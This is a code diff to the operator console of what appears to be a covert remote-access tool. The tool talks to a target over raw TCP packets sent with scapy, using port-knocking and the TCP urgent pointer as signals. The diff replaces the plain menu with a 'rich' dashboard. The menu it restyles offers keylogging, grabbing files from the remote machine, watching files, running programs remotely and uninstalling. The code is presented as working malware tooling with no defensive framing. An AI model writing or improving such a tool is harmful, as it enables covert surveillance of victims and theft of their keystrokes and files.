@@ -5,6 +5,10 @@ from scapy.all import sniff, TCP, send, IP, Raw
 import sys
 import socket
 import time
+from rich.console import Console
+from rich.panel import Panel
+from rich.live import Live
+from rich.table import Table
 
 eof_signal = 65535  # End of file signal
 received_data = ""
@@ -15,6 +19,8 @@ sniffing_event = threading.Event()
 ack_event = threading.Event()
 sniff_thread = None
 timeout = 10  # Timeout in seconds for acknowledgment
+
+console = Console()
 
 def get_local_ip():
     """Get the local IP address of the machine."""
@@ -100,7 +106,7 @@ def packet_callback(packet):
             if urgent_pointer_value == eof_signal:
                 print("EOF signal detected.")
                 if current_signal == "RUN":
-                    print(f"Program output:\n{decoded_data}\n")
+                    print(f"Program output:\n{decoded_data}")
                 else:
                     save_file(decoded_data)
                 current_signal = None  # Reset current_signal after handling
@@ -231,18 +237,31 @@ def ack_callback(packet):
     except AttributeError:
         pass  # Ignore packets without the expected layers/attributes
 
+def display_dashboard():
+    """Create and return the dashboard panel."""
+    table = Table(title="Dashboard", show_header=False, box=None)
+    table.add_row("1. Start Keylogger")
+    table.add_row("2. Stop Keylogger")
+    table.add_row("3. File Send")
+    table.add_row("4. File Receive")
+    table.add_row("5. File/Dir Watcher")
+    table.add_row("6. Run Program")
+    table.add_row("7. Exit")
+    table.add_row("8. Uninstall")
+    return Panel(table, title="Options", border_style="cyan")
+
 def main():
     """Main function to handle user input and execute corresponding actions."""
     global current_signal, dest_ip
-    dest_ip = input("Enter the destination IP for sending signals: ")
-    knock_sequence = input("Enter the port-knocking sequence (comma-separated): ").split(",")
+    dest_ip = console.input("[cyan]Enter the destination IP for sending signals:[/cyan] ")
+    knock_sequence = console.input("[cyan]Enter the port-knocking sequence (comma-separated):[/cyan] ").split(",")
 
     # Start sniffing for acknowledgment packets with more specific filter
     sniff_thread = threading.Thread(
-        target=sniff, 
+        target=sniff,
         kwargs={
-            'filter': f"tcp and src host {dest_ip} and (tcp[13] & 0x12 != 0)", 
-            'prn': ack_callback, 
+            'filter': f"tcp and src host {dest_ip} and (tcp[13] & 0x12 != 0)",
+            'prn': ack_callback,
             'store': 0
         }
     )
@@ -255,29 +274,23 @@ def main():
     options = {
         "1": lambda: start_keylogger(),
         "2": lambda: stop_keylogger(),
-        "3": lambda: start_file_transfer(input("Enter the file path to transfer: ")),
-        "4": lambda: start_file_grabber(input("Enter the file path to receive: ")),
-        "5": lambda: start_watcher(input("Enter the file or directory to watch: ")),
-        "6": lambda: start_runner(input("Enter the program to run: ")),
+        "3": lambda: start_file_transfer(console.input("[cyan]Enter the file path to transfer:[/cyan] ")),
+        "4": lambda: start_file_grabber(console.input("[cyan]Enter the file path to receive:[/cyan] ")),
+        "5": lambda: start_watcher(console.input("[cyan]Enter the file or directory to watch:[/cyan] ")),
+        "6": lambda: start_runner(console.input("[cyan]Enter the program to run:[/cyan] ")),
         "7": lambda: close_connection(),
         "8": lambda: uninstall(),
     }
-    while True:
-        print("Choose an option:")
-        print("1. Start Keylogger")
-        print("2. Stop Keylogger")
-        print("3. File Send")
-        print("4. File Receive")
-        print("5. File/Dir Watcher")
-        print("6. Run Program")
-        print("7. Exit")
-        print("8. Uninstall")
-        choice = input("Enter your choice: ")
 
-        if choice in options:
-            options[choice]()
-        else:
-            print("Invalid choice.")
+    with Live(display_dashboard(), refresh_per_second=4) as live:
+        while True:
+            choice = console.input("[cyan]Enter your choice:[/cyan] ")
+
+            if choice in options:
+                console.log(f"[green]Executing option {choice}...[/green]")
+                options[choice]()
+            else:
+                console.log("[red]Invalid choice.[/red]")
 
 if __name__ == "__main__":
     main()
